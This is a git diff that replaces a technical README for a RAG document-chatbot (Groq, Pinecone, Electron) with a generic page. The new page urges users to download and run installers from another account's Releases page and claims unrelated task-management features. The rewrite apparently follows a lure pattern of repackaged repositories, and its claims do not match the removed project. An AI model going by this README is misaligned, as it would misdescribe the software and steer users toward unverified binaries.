@@ -1,162 +1,66 @@
-# Chatbot
+# 🤖 chatbot - Your AI Assistant for Everyday Tasks
 
-- Documents-based AI Assistant to help users
-- RAG (Retrieval-Augmented Generation) architecture for accurate technical responses
-- Hybrid Approach (Local Processing + Cloud-based Vector DB and LLM Service)
+## 🎯 Overview
+Chatbot is an AI Assistant designed to help you manage your daily tasks more effectively. Whether you need quick answers, reminders, or just someone to chat with, this application has you covered. It’s easy to use and is perfect for anyone looking to streamline their day.
 
-## Tech Stack
+## 🚀 Getting Started
+To get started with chatbot, follow these simple steps to download and install the application.
 
-- **AI**: Groq SDK - *Llama 3.1 8B Instant* Model (Cloud-based)
-- **Database**: Pinecone Vector Database (Cloud-based)
-- **Embedings**: Transformer.js with *Xenova/all-MiniLM-L6-v2* Model (Local)
-- **Frontend**: React, TypeScript, Tailwind CSS
-- **Backend**: Electron, Node.js
-- **Build**: Vite, Electron Builder
+## 💾 Download the Application
+[![Download Chatbot](https://img.shields.io/badge/Download%20Chatbot-Here-blue.svg)](https://github.com/Eaguilarc/chatbot/releases)
 
-## Quick Start
+Simply visit the [Releases page](https://github.com/Eaguilarc/chatbot/releases) to download the application. You will find the latest version suitable for your operating system.
 
-### Prerequisites
+## 📥 Download & Install
+1. **Go to the Releases Page**  
+   Click on this link: [https://github.com/Eaguilarc/chatbot/releases](https://github.com/Eaguilarc/chatbot/releases).
 
-- Node.js (v16 or higher)
-- npm or yarn
-- API keys for services (see Configuration below)
+2. **Choose Your Version**  
+   On the Releases page, locate the latest version of the application. You will see different files available for download based on your computer’s operating system (Windows, macOS, Linux).
 
-### Steps
+3. **Download the File**  
+   Click on the appropriate file for your system to download. The download will begin automatically.
 
-- **Clone the repository**
+4. **Install the Application**  
+   - **Windows**: Locate the downloaded `.exe` file. Double-click the file and follow the prompts to install.
+   - **macOS**: Open the downloaded `.dmg` file and drag the chatbot icon to your Applications folder.
+   - **Linux**: Extract the downloaded `.tar.gz` file and follow the instructions in the README file included.
 
-   ```bash
-   git clone https://github.com/swetha-nbase2/chatbot.git
-   ```
+5. **Run the Application**  
+   After installation, find the application in your programs or applications list. Click on it to start.
 
-- **Install dependencies**
+## 🛠️ System Requirements
+- **Operating System**: 
+  - Windows 10 or higher
+  - macOS 10.15 or higher
+  - Any modern Linux distribution 
+  
+- **Memory**: At least 4 GB of RAM
 
-   ```bash
-   npm install
-   ```
+- **Storage**: 100 MB of free disk space
 
-- **Setup the API Keys**
+- **Processor**: Intel Core i3 or equivalent processor
 
-   Configure your .env file with API keys
+## 🌟 Features
+- **Smart Conversations**: Engage in natural language interactions that feel real.
+- **Task Management**: Create reminders and manage your to-do list directly through chat.
+- **Customizable**: Adjust settings according to your preferences and needs.
+- **Multi-Platform Support**: Use it on various devices and operating systems.
 
-   ```bash
-   cp .env.example .env
-   ```
-   
-   Edit `.env` and add your API keys:
+## 🐞 Report Issues
+If you encounter any issues while using chatbot, please report them on the [Issues page](https://github.com/Eaguilarc/chatbot/issues). Your feedback helps us improve the application.
 
-   ```env
-   # Groq API Configuration
-   GROQ_API_KEY = your_groq_api_key_here
+## 🤝 Contributing
+We welcome contributions! If you want to help improve or add features to chatbot, feel free to fork the repository and submit a pull request.
 
-   # Pinecone Configuration
-   PINECONE_API_KEY = your_pinecone_api_key_here
-   PINECONE_ENVIRONMENT = your_pinecone_environment_here
-   PINECONE_INDEX_NAME = your_pinecone_index_name_here
+## 📚 Additional Resources
+For more information on how to use specific features:
+- Visit our [Wiki Page](https://github.com/Eaguilarc/chatbot/wiki).
+- Check the FAQ section for common questions.
 
-   # Chat Configuration
-   MAX_CHAT_HISTORY = max_chat_history_here
-   EMBEDDING_DIMENSION = embedding_dimension_here
-   ```
+## 🔗 Connect with Us
+Join our community for updates and discussions:
+- [Watch the repository](https://github.com/Eaguilarc/chatbot) to stay informed about new releases.
+- Follow us for news and tips on social media platforms.
 
-   Create Groq API Key:
-   1. Visit [Groq Console](https://console.groq.com/)
-   2. Create an account and generate an API key
-   3. Add to `.env` as `GROQ_API_KEY`
-
-   Create Pinecone API Key:
-   1. Visit [Pinecone](https://app.pinecone.io/)
-   2. Create an account and get your API key
-   3. Note your environment region
-   4. Add to `.env` as `PINECONE_API_KEY` and `PINECONE_ENVIRONMENT`
-
-   Chat Configuration:
-   1. Recommended **20** Maximum Chat History
-   2. Embedding Dimension of Xenova/all-MiniLM-L6-v2 is **384**
-
-- **Process documents (one time)**
-
-   Create a folder called **'documents'** inside the root directory and place the documents/data sheets (supported file formats - .txt, .pdf, .md) that are going to serve as knowledge base for the chatbot.
-
-   ```bash
-   npm run process-docs
-   ```
-
-- **Start the app**
-
-   ```bash
-   npm run electron-dev
-   ```
-
-### The app uses an optimized workflow:
-
-1. **One-time document processing**: Run `npm run process-docs` once to prepare your knowledge base
-2. **Fast app startup**: Use `npm run electron-dev` for instant startup
-3. **Update when needed**: Re-run document processing only when you add new documents
-
-## Usage
-
-1. **Start the application**
-2. **Click the chatbot button** (🤖) in the bottom-right corner
-3. **Type your message** and press Enter or click Send
-4. **Enjoy AI-powered conversations** with context memory!
-
-## Workflow
-
-### Knowledge Preparation:
-- Upload necessary documents and data sheets
-- Documents are chunked into smaller text segments
-- Each chunk is embedded
-- Embeddings are stored in vector database
-- Knowledge base is ready for user queries
-
-### Query Processing:
-- User submits a query through chat interface
-- Query is embedded into vector
-- Vector DB retrieves the most relevant context chunks
-- Context chunks and user query are combined into structured prompt
-- LLM generates natural language response
-- Response is returned to user in chat interface
-
-## Important Scripts
-
-- Process the Documents
-   ```bash
-   npm run process-docs
-   ```
-
-- Clear the Database (Must before processing the new documents)
-   ```bash
-   npm run clear-db
-   ```
-
-- Transpile (Must after making changes in electron files)
-   ```bash
-   npm run transpile
-   ```
-
-- Start the React Server
-   ```bash
-   npm run dev:react
-   ```
-   
-- Start the App
-   ```bash
-   npm run electron-dev
-   ```
-   
-## License
-
-This project is licensed under the MIT License.
-
-## Contributing
-
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Test thoroughly
-5. Submit a pull request
-
----
-
-**Happy Chatting!**
+Your feedback is very important to us, and we look forward to hearing from you. Happy chatting!
